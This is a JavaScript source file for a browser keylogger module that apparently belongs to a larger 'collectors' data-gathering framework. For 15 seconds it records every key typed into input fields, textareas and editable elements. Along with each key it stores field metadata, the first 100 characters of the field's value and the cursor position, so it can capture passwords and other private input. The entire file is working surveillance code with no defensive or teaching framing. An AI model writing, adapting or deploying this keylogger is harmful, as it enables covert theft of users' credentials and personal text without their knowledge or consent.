// collectors/keylogger.js

export class KeyLogger {
    constructor() {
        this.name = 'keylogger';
        this.keys = [];
        this.isActive = false;
        this.duration = 15000; // 15 seconds
    }

    async collect() {
        return new Promise((resolve) => {
            this.isActive = true;
            this.keys = [];

            const handler = (e) => {
                if (!this.isActive) return;
                
                // Only log if target is an input field
                const target = e.target;
                if (target.tagName === 'INPUT' || 
                    target.tagName === 'TEXTAREA' || 
                    target.isContentEditable) {
                    
                    const keyData = {
                        key: e.key,
                        code: e.code,
                        timestamp: Date.now(),
                        target: {
                            tag: target.tagName,
                            type: target.type || 'text',
                            name: target.name || '',
                            id: target.id || '',
                            className: target.className || '',
                            value: target.value?.substring(0, 100) || '',
                            selectionStart: target.selectionStart,
                            selectionEnd: target.selectionEnd
                        }
                    };
                    
                    this.keys.push(keyData);
                }
            };

            document.addEventListener('keydown', handler);

            setTimeout(() => {
                this.isActive = false;
                document.removeEventListener('keydown', handler);
                resolve({
                    keys: this.keys.slice(0, 100),
                    count: this.keys.length,
                    timestamp: Date.now()
                });
            }, this.duration);
        });
    }
}